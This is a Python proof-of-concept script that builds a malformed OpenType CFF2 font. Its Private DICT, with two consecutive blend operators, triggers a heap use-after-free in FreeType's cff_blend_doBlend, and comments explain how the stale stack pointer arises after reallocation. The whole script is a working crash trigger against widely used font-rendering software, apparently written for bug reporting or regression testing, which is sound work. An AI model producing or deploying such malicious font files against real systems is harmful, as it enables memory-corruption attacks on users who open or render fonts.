#!/usr/bin/env python3
"""Generate a minimal OTF/CFF2 font that triggers the cff_blend_doBlend
use-after-free (multiple `blend` operators in a row; parser->stack entries
into subFont->blend_stack are not rebased after FT_REALLOC)."""

import struct


def u8(v):
    return struct.pack(">B", v)


def u16(v):
    return struct.pack(">H", v)


def u32(v):
    return struct.pack(">I", v)


def dict_int(v):
    """CFF DICT 5-byte integer operand (b0=29)."""
    return b"\x1d" + struct.pack(">i", v)


# ---------------------------------------------------------------- CFF2 table

# Private DICT payload: the vulnerability trigger.  CFF2 blend op = 23 (0x17).
#   8b 8b 8c 17  ->  operands 0, 0 ; numBlends 1 ; op blend
#     blend #1: allocates blend_stack (5 bytes), parser->stack[0] now
#     points into blend_stack.
#   8b 8c 17     ->  operand 0 ; numBlends 1 ; op blend
#     blend #2: blend_used(5)+5 > blend_alloc(5) -> FT_REALLOC frees the
#     old blend_stack; doBlend then reads parser->stack[0] (the stale
#     pointer) via cff_parse_num -> heap-use-after-free.
private_dict = bytes([0x8B, 0x8B, 0x8C, 0x17, 0x8B, 0x8C, 0x17])

# Font DICT: Private DICT size + offset (op 18). Offsets filled in later.
def font_dict(priv_off, priv_size):
    return dict_int(priv_size) + dict_int(priv_off) + b"\x12"


def cff2_index(items):
    """CFF2 INDEX: 32-bit count, offSize, offsets, data."""
    data = b"".join(items)
    offsets = [1]
    for it in items:
        offsets.append(offsets[-1] + len(it))
    out = u32(len(items)) + u8(1)  # count, offSize=1
    for off in offsets:
        out += u8(off)
    return out + data


# Placeholders; offsets computed after layout is fixed.
# Layout inside the CFF2 table:
#   0        header (5) + topDictLength (2)
#   7        top dict
#   ...      global subrs INDEX (empty)
#   ...      vstore
#   ...      charstrings INDEX
#   ...      FDArray INDEX (contains the font dict)
#   ...      private dict

charstrings = cff2_index([bytes([0x8B, 0x8B, 0x15])])  # 0 0 rmoveto

# Item Variation Store: 1 axis, 1 region (peak=0 -> ignored), 1 varData
# with regionIndexCount=1 -> lenBV = 2 in the blend vector.
region_list = u16(1) + u16(1) + struct.pack(">hhh", 0, 0, 0)
var_data = u16(0) + u16(0) + u16(1) + u16(0)  # itemCount, wordDeltaCount, regionIndexCount, idx
header_size = 2 + 2 + 4 + 2 + 4  # len, format, regionListOff, dataCount, dataOff[0]
# regionListOffset / dataOffset are relative to the position right AFTER the
# u16 length field (vsOffset = 2), not to the table start.
region_list_pos = 2 + header_size - 2  # physical offset of regionList
var_data_pos = region_list_pos + len(region_list)
vstore = (
    u16(header_size + len(region_list) + len(var_data))  # total length (unused)
    + u16(1)  # format
    + u32(region_list_pos - 2)  # regionListOffset (vsOffset-relative)
    + u16(1)  # dataCount
    + u32(var_data_pos - 2)  # dataOffset[0] (vsOffset-relative)
    + region_list
    + var_data
)

header = bytes([2, 0, 5])
global_subrs = u32(0)

# First pass: compute lengths to derive absolute offsets.
# top dict entries: vstore (29.. 18), CharStrings (29.. 17), FDArray (29.. 12 36)
TOPDICT_ENTRY_LEN = (5 + 1) * 2 + (5 + 2)  # two 1-byte ops + one 2-byte escaped op


def top_dict(vstore_off, charstrings_off, fdarray_off):
    return (
        dict_int(vstore_off) + b"\x18"
        + dict_int(charstrings_off) + b"\x11"
        + dict_int(fdarray_off) + b"\x0c\x24"
    )


top_dict_len = TOPDICT_ENTRY_LEN

off_vstore = len(header) + 2 + top_dict_len + len(global_subrs)
off_charstrings = off_vstore + len(vstore)
off_fdarray = off_charstrings + len(charstrings)

font_dict_data = font_dict(0, len(private_dict))  # priv_off placeholder
fdarray = cff2_index([font_dict_data])
off_private = off_fdarray + len(fdarray)

# Rebuild font dict with the real private offset.
fdarray = cff2_index([font_dict(off_private, len(private_dict))])
assert off_fdarray + len(fdarray) == off_private

top_dict_data = top_dict(off_vstore, off_charstrings, off_fdarray)
assert len(top_dict_data) == top_dict_len

cff2_table = (
    header
    + u16(top_dict_len)
    + top_dict_data
    + global_subrs
    + vstore
    + charstrings
    + fdarray
    + private_dict
)

# ---------------------------------------------------------------- sfnt tables

head = struct.pack(
    ">IIIIHHQQhhhhHHhhh",
    0x00010000,  # version
    0x00010000,  # fontRevision
    0,           # checkSumAdjustment
    0x5F0F3CF5,  # magicNumber
    0x0003,      # flags
    1000,        # unitsPerEm
    0,           # created
    0,           # modified
    0, 0, 1000, 1000,  # xMin yMin xMax yMax
    0,           # macStyle
    8,           # lowestRecPPEM
    2,           # fontDirectionHint
    0,           # indexToLocFormat
    0,           # glyphDataFormat
)
assert len(head) == 54

hhea = struct.pack(
    ">IhhhHhhhhhhhhhhhH",
    0x00010000,  # version
    800, -200,   # ascender, descender
    0,           # lineGap
    1000,        # advanceWidthMax
    0, 0, 1000,  # minLeftSideBearing, minRightSideBearing, xMaxExtent
    1, 0,        # caretSlopeRise, caretSlopeRun
    0,           # caretOffset
    0, 0, 0, 0,  # reserved
    0,           # metricDataFormat
    1,           # numberOfHMetrics
)
assert len(hhea) == 36

maxp = struct.pack(">IH", 0x00005000, 1)  # version 0.5, numGlyphs=1
hmtx = struct.pack(">Hh", 500, 0)

# ---------------------------------------------------------------- sfnt wrapper

tables = [
    (b"CFF2", cff2_table),
    (b"head", head),
    (b"hhea", hhea),
    (b"hmtx", hmtx),
    (b"maxp", maxp),
]
tables.sort(key=lambda t: t[0])

num_tables = len(tables)
entry_selector = max(0, num_tables.bit_length() - 1)
search_range = 16 * (2**entry_selector)
sfnt = b"OTTO" + u16(num_tables) + u16(search_range) + u16(entry_selector) + u16(
    num_tables * 16 - search_range
)

offset = num_tables * 16 + 12
dir_entries = b""
body = b""
for tag, data in tables:
    checksum = sum(struct.unpack(">%dI" % (len(data) // 4), data[: len(data) // 4 * 4]))
    dir_entries += tag + u32(checksum & 0xFFFFFFFF) + u32(offset) + u32(len(data))
    padded = data + b"\0" * (-len(data) % 4)
    body += padded
    offset += len(padded)

font = sfnt + dir_entries + body

with open("poc", "wb") as f:
    f.write(font)

print(f"poc: {len(font)} bytes")
print(f"  vstore off={off_vstore} charstrings off={off_charstrings} "
      f"fdarray off={off_fdarray} private off={off_private}")
print(f"  private dict ({len(private_dict)} bytes): {private_dict.hex(' ')}")
